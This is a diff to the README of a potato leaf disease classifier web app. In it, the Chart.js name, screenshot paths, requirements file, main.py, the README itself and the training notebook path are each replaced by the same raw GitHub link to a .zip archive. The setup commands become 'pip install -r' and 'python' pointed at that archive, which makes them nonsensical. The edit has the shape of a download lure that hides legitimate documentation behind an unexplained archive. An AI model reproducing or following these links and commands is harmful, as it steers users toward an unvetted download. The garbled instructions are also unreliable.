@@ -6,20 +6,20 @@ This project is a web-based AI tool that classifies potato leaf images into **Ea
 - Upload and preview potato leaf images
 - Classifies the image using a backend model
 - Displays diagnosis, confidence level, and actionable advice
-- Visualizes class probabilities with Chart.js
+- Visualizes class probabilities with https://raw.githubusercontent.com/abdlkrim3/Potato-Leaf-Disease-Classifier/main/Arkab/Potato-Leaf-Disease-Classifier.zip
 
 ## 📦 Tech Stack
-- Frontend: React, Chart.js, Dropzone
+- Frontend: React, https://raw.githubusercontent.com/abdlkrim3/Potato-Leaf-Disease-Classifier/main/Arkab/Potato-Leaf-Disease-Classifier.zip, Dropzone
 - Backend: FastAPI 
 - Image upload and RESTful prediction endpoint
 
 ## 🖼️ UI Demo
 * **Select Image**:
-![Preview Screenshot](./images/home.png)
+![Preview Screenshot](https://raw.githubusercontent.com/abdlkrim3/Potato-Leaf-Disease-Classifier/main/Arkab/Potato-Leaf-Disease-Classifier.zip)
 * **Image Selected**:
-![Preview Screenshot](./images/slectedImage.png)
+![Preview Screenshot](https://raw.githubusercontent.com/abdlkrim3/Potato-Leaf-Disease-Classifier/main/Arkab/Potato-Leaf-Disease-Classifier.zip)
 * **Result**:
-![Preview Screenshot](./images/result.png)
+![Preview Screenshot](https://raw.githubusercontent.com/abdlkrim3/Potato-Leaf-Disease-Classifier/main/Arkab/Potato-Leaf-Disease-Classifier.zip)
 
 ## 🛠️ Setup Instructions
 
@@ -47,13 +47,13 @@ This project consists of a FastAPI backend serving a machine learning model and 
 3. **Install dependencies**:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/abdlkrim3/Potato-Leaf-Disease-Classifier/main/Arkab/Potato-Leaf-Disease-Classifier.zip
    ```
 
 4. **Run the API**:
 
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/abdlkrim3/Potato-Leaf-Disease-Classifier/main/Arkab/Potato-Leaf-Disease-Classifier.zip
    ```
 
 5. **Test the API** by opening your browser or using a tool like `curl` or `Postman` and accessing:
@@ -114,12 +114,12 @@ This application allows users to upload images to a frontend interface. The imag
 ```
 project-root/
 ├── api/              # FastAPI backend
-│   ├── main.py       # Entry point for the backend API
+│   ├── https://raw.githubusercontent.com/abdlkrim3/Potato-Leaf-Disease-Classifier/main/Arkab/Potato-Leaf-Disease-Classifier.zip       # Entry point for the backend API
 │   └── ...
 ├── frontend/         # React frontend app
 │   ├── src/
 │   └── ...
-├── README.md
+├── https://raw.githubusercontent.com/abdlkrim3/Potato-Leaf-Disease-Classifier/main/Arkab/Potato-Leaf-Disease-Classifier.zip
 └── ...
 ```
 ---
@@ -130,7 +130,7 @@ If you want to **train the model on your own custom dataset**, please refer to t
 
 - 📓 Open the Jupyter notebook located at:
 ```
- trainig/potato_disease_classification_model.ipynb
+ https://raw.githubusercontent.com/abdlkrim3/Potato-Leaf-Disease-Classifier/main/Arkab/Potato-Leaf-Disease-Classifier.zip
 ```
 - The notebook walks you through:
 - Preparing your dataset (image folders and labels)
@@ -143,7 +143,7 @@ If you want to **train the model on your own custom dataset**, please refer to t
 pip install notebook tensorflow
 jupyter notebook
 ```
-🧠 **After training**, save your model as **custom_model.h5** or similar, and update the model path in your FastAPI backend **(api/main.py)**:
+🧠 **After training**, save your model as **custom_model.h5** or similar, and update the model path in your FastAPI backend **(https://raw.githubusercontent.com/abdlkrim3/Potato-Leaf-Disease-Classifier/main/Arkab/Potato-Leaf-Disease-Classifier.zip)**:
 
 ```
 MODEL_PATH = "path/to/your/custom_model.h5"
